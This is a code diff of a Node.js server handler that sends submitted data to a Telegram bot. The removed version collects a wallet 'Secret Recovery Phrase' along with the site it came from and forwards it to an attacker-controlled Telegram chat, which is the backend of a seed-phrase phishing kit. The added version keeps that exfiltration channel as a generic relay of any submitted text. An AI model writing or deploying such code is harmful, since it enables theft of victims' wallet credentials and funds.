@@ -1,34 +1,21 @@
+// This file runs on the server (Node.js)
 export default async function handler(req, res) {
-  if (req.method !== "POST") {
-    return res.status(405).json({ error: "Method not allowed" });
-  }
+  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+  const { text } = req.body;
 
-  const { phrase, website } = req.body;
-  if (!phrase || !website) {
-    return res.status(400).json({ error: "Missing data" });
-  }
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const body = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text,
+  };
 
-  // Set your wallet name here (do NOT expose in frontend)
-  const walletName = "XVVerse"; // Change to your desired wallet name
-
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-  const message = `Wallet: ${walletName}\nWebsite: ${website}\nSecret Recovery Phrase:\n${phrase}`;
-
-  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-  const response = await fetch(telegramUrl, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: message
-    })
+  const telegramRes = await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body),
   });
 
-  if (response.ok) {
-    return res.status(200).json({ success: true });
-  } else {
-    return res.status(500).json({ error: "Failed to send message" });
-  }
+  const data = await telegramRes.json();
+  res.status(200).json(data);
 }
